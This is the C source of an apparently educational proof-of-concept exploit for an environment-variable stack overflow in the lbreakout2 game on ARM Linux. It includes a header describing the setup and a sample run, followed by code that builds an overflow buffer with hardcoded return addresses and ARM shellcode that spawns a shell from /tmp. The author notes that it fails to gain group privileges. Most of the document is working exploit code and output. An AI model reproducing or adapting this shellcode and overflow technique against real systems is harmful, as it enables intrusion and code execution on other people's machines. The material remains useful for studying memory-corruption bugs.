/* lbreakout2 environment variable stack overflow
   ==============================================
 Exploit for lbreakout2, a ball-and-paddle game with nice graphics that
 exists in debian package repo. The application is installed with group
 "games" permissions, however once this bug is hit the application has
 already dropped privileges to the calling users group. This means it
 was not possible to elevate privileges using the binary. This exploit
 is a proof-of-concept for ARM architecture which attempts to obtain
 the group privileges before calling a shell ultimately failing. 
 
 This bug is a classic environment variable overflow when handling a
 large string in HOME. No ASLR bypass and assumes 
 kernel.randomize_va_space is disabled. Shared for educational purposes.
 Shellcode runs the binary from "/tmp/sh/.lgames"

 e.g.

 pi@raspberrypi:~$ uname -a
 Linux raspberrypi 3.10.25 #1 Sat Dec 28 20:50:23 EST 2013 armv6l GNU/Linux
 pi@raspberrypi:~$ mkdir /tmp/sh
 pi@raspberrypi:~$ cp /bin/sh /tmp/sh/.lgames
 pi@raspberrypi:~$ ls -al /usr/games/lbreakout2
 -rwxr-sr-x 1 root games 372568 Jun 22  2012 /usr/games/lbreakout2
 pi@raspberrypi:~$ gcc lbreakout-exploit.c -o lbreakout-exploit
 pi@raspberrypi:~$ ./lbreakout-exploit
 [ lbreakout2 stack overflow exploit (arm)
 buffer size = 499
 LBreakout2 2.6.3
 Copyright 2001-2011 Michael Speck
 Published under GNU GPL
 ---
 Looking up data in: /usr/share/games/lbreakout2
 Looking up highscores in: /var/games
 Looking up custom levels in: xxxxxxxxxxxxxxxxxxxxxxxxxxxxD???xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0???/?< .'??FxF
0???
    '?//tmp/sh/.lgames/lbreakout2-levels
 couldn't find/open config directory 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxD???xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0???/?< .'??FxF
0???
    '?//tmp/sh/.lgames'
 attempting to create it... failed
 $ 

 -- Hacker Fantastic
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE 500

char shellcode[]="\x01\x30\x8f\xe2"
		 "\x13\xff\x2f\xe1"
		 "\x3c\x20"
		 "\x2e\x27"
		 "\x01\xdf"
		 "\xc0\x46"
		 "\x78\x46\x0a\x30"
		 "\x01\x90\x01\xa9"
		 "\x92\x1a\x0b\x27"
		 "\x01\xdf"
		 "//tmp/sh";

int main(int argc,char* argv[]){
	long ptr;
	char *buffer = malloc(BUFSIZE);
	char *argp[] = {"/usr/games/lbreakout2",NULL};
	char *env[] = {buffer,NULL};
	if(!buffer){
		printf("[ malloc() failure\n");	
		exit(-1);	
	}
	printf("[ lbreakout2 stack overflow exploit (arm)\n");
	memset(buffer,0,BUFSIZE);
	strncpy(buffer,"HOME=",5);
	ptr = (long)buffer+strlen(buffer);
	memset((void*)ptr,'x',28);
	ptr += 28;
	// $pc here
	strncat(buffer,"\x44\xf7\xff\xbe",4);
	ptr += 4;
	memset((void*)ptr,'x',48);
	// 4 bytes for r3 ldr here (ptr to ptr for pc)
	strncat(buffer,"\xf0\xf6\xff\xbe",4);
	ptr = (long)buffer+strlen(buffer);
	memset((void*)ptr,'A',BUFSIZE-strlen(buffer)-strlen(shellcode)-1);
	ptr = (long)buffer+strlen(buffer);
	memcpy((void*)ptr,(void*)&shellcode,strlen(shellcode));
	printf("buffer size = %d\n",strlen(buffer));
	execve("/usr/games/lbreakout2",argp,env);	
	exit(0);
}

